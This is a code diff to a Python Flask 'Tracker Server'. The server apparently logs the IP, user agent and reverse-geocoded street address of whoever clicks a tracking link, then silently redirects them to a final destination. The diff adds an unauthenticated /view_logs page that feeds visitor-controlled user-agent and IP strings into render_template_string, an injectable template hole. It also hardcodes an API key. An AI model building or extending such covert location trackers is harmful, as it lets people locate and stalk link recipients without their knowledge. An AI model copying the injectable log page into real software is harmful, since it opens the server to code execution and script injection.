@@ -2,7 +2,7 @@
 
 from flask import Flask, request, redirect, render_template_string, render_template
 from ip_locator import get_location_from_ip 
-from opencage.geocoder import OpenCageGeocode # NEW: OpenCage Import
+from opencage.geocoder import OpenCageGeocode 
 import datetime
 import sqlite3 
 import os 
@@ -19,6 +19,7 @@ OPENCAGE_API_KEY = "57846fc1e1014975b603db1c658fcf50" # REPLACE WITH YOUR ACTUAL
 if OPENCAGE_API_KEY != "57846fc1e1014975b603db1c658fcf50":
     geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
 else:
+    # If key is missing, the geocoding functions will return "API Key Missing"
     geocoder = None
 
 
@@ -93,6 +94,13 @@ def get_address_from_coords(lat, lon):
         return "Geocoding API Error"
 
 
+# 0. NEW ROUTE: Home Page (Needed for Server Stability)
+@app.route('/')
+def home():
+    """A basic route to confirm the server is running."""
+    return "<h1>Tracker Server is Running!</h1><p>Use the /track_click route to start tracking.</p>"
+
+
 # --- 1. Main Link Click (Entry Point) ---
 @app.route('/track_click')
 def track_click():
@@ -144,15 +152,15 @@ def fallback():
     # Run IP Geolocation (returns general coordinates)
     location_data = get_location_from_ip(ip)
     
+    # Check if IP lookup returned coordinates
     if location_data and location_data.get('latitude') and location_data.get('longitude'):
-        # If coordinates are available from the IP lookup, reverse geocode them.
         lat = location_data['latitude']
         lon = location_data['longitude']
         full_address = get_address_from_coords(lat, lon)
         
         # Update the location data with the full address
         location_data['city'] = full_address
-        location_data['country'] = "IP_GEO_LOC" # Change source type for clarity
+        location_data['country'] = "IP_GEO_LOC" # Source type: IP Geolocation
     
     elif not location_data:
         # Handle complete failure
@@ -162,6 +170,26 @@ def fallback():
     log_click_data(ip, location_data, ua, source="IP_FALLBACK")
     
     return redirect(FINAL_DESTINATION_URL)
+
+
+# --- 5. View Logs (Admin Route) ---
+@app.route('/view_logs')
+def view_logs():
+    if not os.path.exists(DATABASE_FILE):
+        return render_template_string("<h1>Logs</h1><p>Database file not found.</p>")
+
+    conn = sqlite3.connect(DATABASE_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, user_agent FROM clicks ORDER BY timestamp DESC")
+    logs = cursor.fetchall()
+    conn.close()
+
+    html = "<h1>Click Tracking Logs</h1><table border='1' style='width: 100%; word-wrap: break-word; table-layout: fixed;'><tr><th>ID</th><th>Time</th><th>IP</th><th>Country</th><th>City (Address)</th><th>Lat</th><th>Lon</th><th>Source</th><th>User Agent</th></tr>"
+    for row in logs:
+        ua_display = row[8][:50] + '...' if len(row[8]) > 50 else row[8]
+        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{ua_display}</td></tr>"
+    html += "</table>"
+    return render_template_string(html)
 
 
 if __name__ == '__main__':
